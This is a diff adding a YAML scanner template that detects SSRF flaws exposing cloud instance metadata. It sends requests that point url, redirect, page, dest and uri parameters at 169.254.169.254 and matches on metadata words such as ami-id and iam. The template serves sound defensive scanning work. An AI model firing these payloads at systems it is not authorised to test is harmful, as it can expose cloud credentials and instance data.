@@ -1,0 +1,36 @@
+id: cloud-metadata-ssrf
+info:
+  name: Cloud Instance Metadata SSRF
+  author: atomic-framework
+  severity: critical
+  description: Detects SSRF vulnerabilities that allow access to cloud instance metadata services (AWS, GCP, Azure).
+  tags: ssrf,cloud,metadata,aws,gcp,azure
+  classification:
+    cwe-id: CWE-918
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
+    cvss-score: 10.0
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?page=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?dest=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?uri=http://169.254.169.254/latest/meta-data/"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "public-hostname"
+          - "iam"
+        condition: or
+
+      - type: status
+        status:
+          - 200
